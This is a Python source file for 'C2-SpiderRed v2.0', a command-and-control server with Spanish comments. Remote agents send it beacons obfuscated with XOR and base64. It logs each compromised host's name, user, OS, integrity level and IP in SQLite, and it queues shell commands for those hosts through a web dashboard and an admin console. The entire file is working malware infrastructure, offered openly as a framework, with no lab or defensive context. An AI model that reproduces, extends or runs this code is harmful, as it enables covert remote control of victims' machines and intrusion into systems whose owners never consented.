#!/usr/bin/env python3
"""
███████╗██████╗ ██╗██████╗ ███████╗██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝██████╔╝█████╗  ██║  ██║
╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██║  ██║
███████║██║     ██║██████╔╝███████╗██║  ██║██║  ██║███████╗██████╔╝
╚══════╝╚═╝     ⚪╚═════╝ ╚══════╝╚═╝  ⚪═╝╚═╝  ⚪═╝╚══════╝╚═════╝ 
                
            C2-SpiderRed v2.0 - Advanced Command & Control
            ════════════════════════════════════════════════
"""

import http.server
import socketserver
import json
import base64
import threading
import sqlite3
import os
import time
import hashlib
import random
import string
from datetime import datetime
from queue import Queue, Empty
import select
import socket
import logging
import cmd  # AÑADIDO

# ==================== CONFIGURACIÓN ====================
CONFIG = {
    "PORT": 8443,
    "MASTER_KEY": "DemoKey123!@#",  # MISMA clave que el agente
    "DB_FILE": "spiderred.db",
    "LOG_FILE": "spiderred.log",
    "SESSION_TIMEOUT": 300,
    "MAX_AGENTS": 1000,
    "API_KEY": "".join(random.choices(string.ascii_letters + string.digits, k=32))
}

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG["LOG_FILE"]),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("C2-SpiderRed")

class Encryption:
    """Manejo de cifrado compatible con el agente C++"""
    
    @staticmethod
    def xor_encrypt(data: str, key: str) -> str:
        """Cifrado XOR simple"""
        result = []
        key_bytes = key.encode()
        for i in range(len(data)):
            result.append(chr(ord(data[i]) ^ key_bytes[i % len(key_bytes)]))
        return ''.join(result)
    
    @staticmethod
    def xor_decrypt(data: str, key: str) -> str:
        """Descifrado XOR (simétrico)"""
        return Encryption.xor_encrypt(data, key)

class SpiderRedDatabase:
    """Base de datos del C2"""
    
    def __init__(self):
        self.conn = sqlite3.connect(CONFIG["DB_FILE"], check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # Tabla de agentes
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE,
                hostname TEXT,
                username TEXT,
                os_version TEXT,
                architecture TEXT,
                integrity TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                ip_address TEXT,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Tabla de comandos
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command_type TEXT,
                command TEXT,
                arguments TEXT,
                issued_at TIMESTAMP,
                completed_at TIMESTAMP,
                status TEXT DEFAULT 'pending',
                result TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        self.conn.commit()
        logger.info("Base de datos inicializada")

class InteractiveSession:
    """Sesión interactiva"""
    
    def __init__(self, session_id, agent_id, session_type="cmd"):
        self.session_id = session_id
        self.agent_id = agent_id
        self.session_type = session_type
        self.command_queue = Queue()
        self.output_buffer = ""
        self.active = True
        self.created_at = datetime.now()
        self.last_activity = datetime.now()
        
        logger.info(f"Sesión creada: {session_id} para agente {agent_id}")
    
    def add_command(self, command_type, command, args=""):
        cmd_id = f"cmd_{int(time.time())}_{random.randint(1000, 9999)}"
        self.command_queue.put({
            'id': cmd_id,
            'type': command_type,
            'command': command,
            'args': args,
            'timestamp': datetime.now().isoformat()
        })
        return cmd_id
    
    def get_next_command(self):
        try:
            self.last_activity = datetime.now()
            return self.command_queue.get_nowait()
        except Empty:
            return None
    
    def add_output(self, output):
        self.output_buffer += output
        self.last_activity = datetime.now()
    
    def get_output(self):
        output = self.output_buffer
        self.output_buffer = ""
        return output
    
    def is_active(self):
        timeout = (datetime.now() - self.last_activity).seconds
        return self.active and timeout < CONFIG["SESSION_TIMEOUT"]

class SessionManager:
    """Gestor de sesiones"""
    
    def __init__(self):
        self.sessions = {}
    
    def create_session(self, agent_id, session_type="cmd"):
        session_id = f"sess_{int(time.time())}_{random.randint(1000, 9999)}"
        session = InteractiveSession(session_id, agent_id, session_type)
        self.sessions[session_id] = session
        return session_id
    
    def get_session(self, session_id):
        return self.sessions.get(session_id)
    
    def list_sessions(self):
        active_sessions = []
        for sess_id, session in self.sessions.items():
            if session.is_active():
                active_sessions.append({
                    'id': sess_id,
                    'agent_id': session.agent_id,
                    'type': session.session_type,
                    'created': session.created_at.isoformat()
                })
        return active_sessions

class WebInterface:
    """Interfaz web del C2"""
    
    @staticmethod
    def generate_dashboard():
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>C2-SpiderRed Dashboard</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #e0e0e0; }
                .container { max-width: 1200px; margin: 0 auto; }
                header { background: #8B0000; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
                .card { background: #2d2d2d; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 10px; border: 1px solid #444; text-align: left; }
                th { background: #333; }
                .btn { background: #8B0000; color: white; border: none; padding: 10px 15px; cursor: pointer; margin: 5px; }
                .terminal { background: black; color: #0f0; padding: 15px; font-family: monospace; height: 300px; overflow-y: auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>🕷️ C2-SpiderRed Dashboard</h1>
                    <p>Advanced Command & Control System</p>
                </header>
                
                <div class="card">
                    <h3>System Overview</h3>
                    <div id="stats">
                        <p>Agents: <span id="agent-count">0</span> | Active Sessions: <span id="session-count">0</span></p>
                    </div>
                </div>
                
                <div class="card">
                    <h3>Active Agents</h3>
                    <table id="agents-table">
                        <thead>
                            <tr>
                                <th>Agent ID</th>
                                <th>Hostname</th>
                                <th>User</th>
                                <th>IP</th>
                                <th>Last Seen</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="agents-body"></tbody>
                    </table>
                </div>
                
                <div class="card">
                    <h3>Terminal</h3>
                    <select id="agent-select">
                        <option value="">Select Agent</option>
                    </select>
                    <input type="text" id="command-input" placeholder="Enter command...">
                    <button class="btn" onclick="sendCommand()">Execute</button>
                    
                    <div class="terminal">
                        <pre id="terminal-output">C2-SpiderRed Terminal Ready...</pre>
                    </div>
                </div>
            </div>
            
            <script>
                async function loadAgents() {
                    try {
                        const response = await fetch('/api/agents');
                        const agents = await response.json();
                        
                        // Update table
                        const tbody = document.getElementById('agents-body');
                        tbody.innerHTML = '';
                        
                        agents.forEach(agent => {
                            const row = document.createElement('tr');
                            row.innerHTML = `
                                <td>${agent.agent_id}</td>
                                <td>${agent.hostname}</td>
                                <td>${agent.username}</td>
                                <td>${agent.ip_address}</td>
                                <td>${new Date(agent.last_seen).toLocaleString()}</td>
                                <td>
                                    <button class="btn" onclick="selectAgent('${agent.agent_id}')">Select</button>
                                </td>
                            `;
                            tbody.appendChild(row);
                        });
                        
                        // Update stats
                        document.getElementById('agent-count').textContent = agents.length;
                    } catch (error) {
                        console.error('Error loading agents:', error);
                    }
                }
                
                let selectedAgent = '';
                
                function selectAgent(agentId) {
                    selectedAgent = agentId;
                    document.getElementById('agent-select').value = agentId;
                    addToTerminal(`\n> Selected agent: ${agentId}\n`);
                }
                
                function addToTerminal(text) {
                    const output = document.getElementById('terminal-output');
                    output.textContent += text;
                    output.scrollTop = output.scrollHeight;
                }
                
                async function sendCommand() {
                    if (!selectedAgent) {
                        addToTerminal('\n> Error: No agent selected\n');
                        return;
                    }
                    
                    const commandInput = document.getElementById('command-input');
                    const command = commandInput.value.trim();
                    
                    if (!command) return;
                    
                    addToTerminal(`\n[${selectedAgent}] $ ${command}\n`);
                    
                    try {
                        const response = await fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                agent_id: selectedAgent,
                                command: command
                            })
                        });
                        
                        const result = await response.json();
                        if (result.success) {
                            addToTerminal('\n> Command sent successfully\n');
                        }
                    } catch (error) {
                        addToTerminal(`\n> Error: ${error.message}\n`);
                    }
                    
                    commandInput.value = '';
                }
                
                // Auto-refresh every 5 seconds
                setInterval(loadAgents, 5000);
                loadAgents();
            </script>
        </body>
        </html>
        """

class SpiderRedHandler(http.server.BaseHTTPRequestHandler):
    """Manejador HTTP del C2"""
    
    def __init__(self, *args, **kwargs):
        self.db = SpiderRedDatabase()
        self.encryption = Encryption()
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        logger.info(f"{self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        """Manejar peticiones GET"""
        try:
            if self.path == '/':
                # Dashboard
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(WebInterface.generate_dashboard().encode())
            
            elif self.path == '/api/agents':
                # API: Listar agentes
                agents = self.get_agents()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(agents).encode())
            
            elif self.path == '/status':
                # Endpoint de estado
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {
                    "status": "online",
                    "version": "2.0",
                    "timestamp": datetime.now().isoformat()
                }
                self.wfile.write(json.dumps(response).encode())
            
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            logger.error(f"Error en GET {self.path}: {e}")
            self.send_error(500, "Internal Server Error")
    
    def do_POST(self):
        """Manejar peticiones POST"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            client_ip = self.client_address[0]
            
            if self.path == '/beacon':
                self.handle_beacon(post_data, client_ip)
            elif self.path == '/api/command':
                self.handle_api_command(post_data)
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            logger.error(f"Error en POST {self.path}: {e}")
            self.send_error(500, "Internal Server Error")
    
    def handle_beacon(self, data, client_ip):
        """Procesar beacon del agente"""
        try:
            if not data:
                self.send_response(400)
                self.end_headers()
                return
            
            # Decodificar Base64
            b64_data = data.decode('utf-8')
            decoded = base64.b64decode(b64_data).decode('latin-1')
            
            # Descifrar XOR
            decrypted = self.encryption.xor_decrypt(decoded, CONFIG["MASTER_KEY"])
            
            # Parsear JSON
            agent_data = json.loads(decrypted)
            
            agent_id = agent_data.get('agent_id')
            
            logger.info(f"Beacon recibido de {agent_id} desde {client_ip}")
            
            # Registrar/actualizar agente
            self.register_agent(agent_data, client_ip)
            
            # Obtener comandos pendientes
            commands = self.get_pending_commands(agent_id)
            
            # Preparar respuesta
            response = {
                "status": "success",
                "agent_id": agent_id,
                "commands": commands,
                "next_beacon": 30
            }
            
            # Cifrar respuesta
            response_json = json.dumps(response)
            encrypted_resp = self.encryption.xor_encrypt(response_json, CONFIG["MASTER_KEY"])
            b64_resp = base64.b64encode(encrypted_resp.encode('latin-1'))
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(b64_resp)
            
            logger.info(f"Respuesta enviada a {agent_id}")
            
        except json.JSONDecodeError as e:
            logger.error(f"Error JSON: {e}")
            self.send_response(400)
            self.end_headers()
        except Exception as e:
            logger.error(f"Error procesando beacon: {e}")
            self.send_response(500)
            self.end_headers()
    
    def handle_api_command(self, data):
        """Manejar comando desde la API"""
        try:
            command_data = json.loads(data.decode('utf-8'))
            agent_id = command_data.get('agent_id')
            command = command_data.get('command')
            
            if not agent_id or not command:
                self.send_response(400)
                self.end_headers()
                return
            
            # Guardar comando en la base de datos
            cursor = self.db.conn.cursor()
            cursor.execute('''
                INSERT INTO commands (agent_id, command_type, command, issued_at, status)
                VALUES (?, 'shell', ?, ?, ?)
            ''', (agent_id, command, datetime.now().isoformat(), 'pending'))
            
            self.db.conn.commit()
            
            response = {"success": True, "message": "Command queued"}
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
            logger.info(f"Comando enviado a {agent_id}: {command}")
            
        except Exception as e:
            logger.error(f"Error en API command: {e}")
            self.send_response(500)
            self.end_headers()
    
    def register_agent(self, agent_data, ip_address):
        """Registrar o actualizar agente"""
        cursor = self.db.conn.cursor()
        now = datetime.now().isoformat()
        
        cursor.execute('''
            INSERT OR REPLACE INTO agents 
            (agent_id, hostname, username, os_version, architecture, 
             integrity, first_seen, last_seen, ip_address)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            agent_data.get('agent_id'),
            agent_data.get('hostname', 'Unknown'),
            agent_data.get('username', 'Unknown'),
            agent_data.get('os_version', 'Unknown'),
            agent_data.get('architecture', 'Unknown'),
            agent_data.get('integrity', 'Unknown'),
            now,
            now,
            ip_address
        ))
        
        self.db.conn.commit()
        
        # Mostrar en consola
        print(f"\n{'='*60}")
        print(f"[{datetime.now().strftime('%H:%M:%S')}] NEW AGENT CONNECTED")
        print(f"  Agent ID: {agent_data.get('agent_id')}")
        print(f"  Hostname: {agent_data.get('hostname')}")
        print(f"  Username: {agent_data.get('username')}")
        print(f"  OS: {agent_data.get('os_version')}")
        print(f"  Arch: {agent_data.get('architecture')}")
        print(f"  Integrity: {agent_data.get('integrity')}")
        print(f"  IP: {ip_address}")
        print(f"{'='*60}\n")
    
    def get_agents(self):
        """Obtener lista de agentes"""
        cursor = self.db.conn.cursor()
        cursor.execute('''
            SELECT agent_id, hostname, username, os_version, architecture,
                   integrity, last_seen, ip_address
            FROM agents 
            ORDER BY last_seen DESC
            LIMIT 50
        ''')
        
        agents = []
        for row in cursor.fetchall():
            agents.append(dict(row))
        
        return agents
    
    def get_pending_commands(self, agent_id):
        """Obtener comandos pendientes para un agente"""
        cursor = self.db.conn.cursor()
        cursor.execute('''
            SELECT id, command, arguments
            FROM commands 
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY issued_at ASC
        ''', (agent_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command'],
                'args': row['arguments'] or ''
            })
            
            # Marcar como enviado
            cursor.execute('''
                UPDATE commands SET status = 'sent' WHERE id = ?
            ''', (row['id'],))
        
        self.db.conn.commit()
        return commands

class AdminCLI(cmd.Cmd):
    """Consola de administración"""
    
    prompt = '🕷️ C2-SpiderRed> '
    intro = '''
╔═══════════════════════════════════════════════════════════════╗
║                🕷️ C2-SpiderRed Admin Console                 ║
║            Advanced Command & Control Framework               ║
╚═══════════════════════════════════════════════════════════════╝

Type 'help' or '?' for available commands.
'''
    
    def __init__(self, db):
        super().__init__()
        self.db = db
    
    def do_agents(self, arg):
        """List all registered agents: agents"""
        cursor = self.db.conn.cursor()
        cursor.execute('SELECT * FROM agents ORDER BY last_seen DESC')
        
        print(f"\n{'ID':<40} {'Hostname':<15} {'User':<15} {'IP':<15} {'Last Seen':<20}")
        print("-"*110)
        
        for row in cursor.fetchall():
            last_seen = datetime.fromisoformat(row['last_seen'])
            now = datetime.now()
            diff = (now - last_seen).seconds
            status = "🟢" if diff < 300 else "🔴"
            
            print(f"{status} {row['agent_id']:<38} {row['hostname']:<15} "
                  f"{row['username']:<15} {row['ip_address']:<15} "
                  f"{last_seen.strftime('%H:%M:%S'):<20}")
        print()
    
    def do_clear(self, arg):
        """Clear the screen: clear"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_exec(self, arg):
        """Execute command on agent: exec <agent_id> <command>"""
        if not arg:
            print("Usage: exec <agent_id> <command>")
            return
        
        args = arg.split(maxsplit=1)
        if len(args) < 2:
            print("Usage: exec <agent_id> <command>")
            return
        
        agent_id, command = args
        
        # Verificar que el agente existe
        cursor = self.db.conn.cursor()
        cursor.execute("SELECT agent_id FROM agents WHERE agent_id = ?", (agent_id,))
        if not cursor.fetchone():
            print(f"Error: Agent {agent_id} not found")
            return
        
        # Guardar comando
        cursor.execute('''
            INSERT INTO commands (agent_id, command_type, command, issued_at, status)
            VALUES (?, 'shell', ?, ?, ?)
        ''', (agent_id, command, datetime.now().isoformat(), 'pending'))
        
        self.db.conn.commit()
        print(f"\n[+] Command queued for agent {agent_id}")
        print(f"[+] Command: {command}")
    
    def do_status(self, arg):
        """Show server status: status"""
        cursor = self.db.conn.cursor()
        
        # Contar agentes
        cursor.execute("SELECT COUNT(*) as count FROM agents")
        agent_count = cursor.fetchone()['count']
        
        # Contar comandos pendientes
        cursor.execute("SELECT COUNT(*) as count FROM commands WHERE status = 'pending'")
        pending_commands = cursor.fetchone()['count']
        
        print(f"\n{'='*50}")
        print("C2-SpiderRed Status")
        print(f"{'='*50}")
        print(f"Agents Registered: {agent_count}")
        print(f"Pending Commands: {pending_commands}")
        print(f"Server Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Master Key: {CONFIG['MASTER_KEY'][:10]}...")
        print(f"{'='*50}\n")
    
    def do_db(self, arg):
        """Database operations: db [clear|info]"""
        if arg == "clear":
            confirm = input("Are you sure you want to clear ALL database? (y/N): ")
            if confirm.lower() == 'y':
                cursor = self.db.conn.cursor()
                cursor.execute("DELETE FROM agents")
                cursor.execute("DELETE FROM commands")
                self.db.conn.commit()
                print("[+] Database cleared")
        elif arg == "info":
            cursor = self.db.conn.cursor()
            
            # Tamaño de la base de datos
            if os.path.exists(CONFIG["DB_FILE"]):
                size = os.path.getsize(CONFIG["DB_FILE"])
                print(f"Database size: {size / 1024:.2f} KB")
            
            # Estadísticas
            cursor.execute("SELECT COUNT(*) as count FROM agents")
            agents = cursor.fetchone()['count']
            
            cursor.execute("SELECT COUNT(*) as count FROM commands")
            commands = cursor.fetchone()['count']
            
            cursor.execute("SELECT COUNT(*) as count FROM commands WHERE status = 'pending'")
            pending = cursor.fetchone()['count']
            
            print(f"Agents: {agents}")
            print(f"Total Commands: {commands}")
            print(f"Pending Commands: {pending}")
        else:
            print("Usage: db [clear|info]")
    
    def do_exit(self, arg):
        """Exit the C2 console: exit"""
        print("\n[+] Shutting down C2 console...")
        return True
    
    def do_help(self, arg):
        """Show help: help [command]"""
        if arg:
            super().do_help(arg)
        else:
            print("\nAvailable commands:")
            print("  agents      - List all registered agents")
            print("  status      - Show server status")
            print("  exec        - Execute command on agent: exec <agent_id> <command>")
            print("  db          - Database operations: db [clear|info]")
            print("  clear       - Clear the screen")
            print("  exit        - Exit the console")
            print()

def start_admin_console(db):
    """Iniciar consola de administración"""
    cli = AdminCLI(db)
    cli.cmdloop()

def main():
    """Función principal"""
    print(r"""
     _____ _____    _____     _     _____ ______ 
    /  ___/  ___|  / __  \   | |   |  _  \|  ___|
    \ `--.\ `--.   `' / /'   | |   | | | || |__  
     `--. \`--. \    / /     | |   | | | ||  __| 
    /\__/ /\__/ /  ./ /___   | |___| |/ / | |___ 
    \____/\____/   \_____/   \_____/___/  \____/ 
    
    ═══════════════════════════════════════════════
    C2-SpiderRed Framework v2.0
    ═══════════════════════════════════════════════
    """)
    
    # Inicializar base de datos
    db = SpiderRedDatabase()
    
    # Iniciar consola de administración en hilo separado
    admin_thread = threading.Thread(
        target=start_admin_console,
        args=(db,),
        daemon=True
    )
    admin_thread.start()
    
    # Configurar y arrancar servidor HTTP
    handler = lambda *args, **kwargs: SpiderRedHandler(*args, **kwargs)
    
    with socketserver.TCPServer(("0.0.0.0", CONFIG["PORT"]), handler) as httpd:
        print(f"\n[🕷️] C2-SpiderRed iniciado en puerto {CONFIG['PORT']}")
        print(f"[🔑] Master Key: {CONFIG['MASTER_KEY']}")
        print(f"[🌐] Dashboard: http://localhost:{CONFIG['PORT']}")
        print(f"[📁] Database: {CONFIG['DB_FILE']}")
        print(f"[📝] Logs: {CONFIG['LOG_FILE']}")
        print(f"\n[⚡] Sistema listo. Usa la consola de administración para operar.")
        print("="*60 + "\n")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Servidor detenido por el usuario")
            httpd.server_close()

if __name__ == "__main__":
    main()
